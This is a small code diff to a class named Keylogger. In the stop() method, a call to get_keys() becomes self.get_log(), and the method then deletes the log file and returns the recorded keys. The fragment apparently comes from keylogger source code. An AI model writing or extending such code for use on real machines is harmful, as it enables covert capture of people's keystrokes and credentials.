@@ -22,7 +22,7 @@ class Keylogger:
             return f.read()
 
     def stop(self):
-        keys = get_keys()
+        keys = self.get_log()
         os.remove(FILENAME)
 
         return keys
